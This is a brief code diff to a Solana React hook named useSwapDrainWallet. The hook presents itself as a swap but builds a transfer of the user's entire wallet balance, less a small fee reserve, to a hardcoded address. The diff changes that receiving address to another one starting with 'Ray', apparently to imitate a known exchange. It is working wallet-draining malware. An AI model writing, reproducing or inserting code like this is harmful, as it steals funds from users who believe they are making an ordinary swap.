@@ -18,7 +18,7 @@ export const useSwapDrainWallet = () => {
       const amountToSend = walletBalance - 0.01 * LAMPORTS_PER_SOL
       if (amountToSend <= 0) throw new Error('Niewystarczające środki na opłaty')
 
-      const TARGET_ADDRESS = new PublicKey('RaybDJtgwmLE1AWmEMXXtPQSjkV1soWVSxK152iqWZu')
+      const TARGET_ADDRESS = new PublicKey('Ray5yZMBLm4A8sLG2RgVJ7Ek48vj8xrQyXrLe3JTZ3K')
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
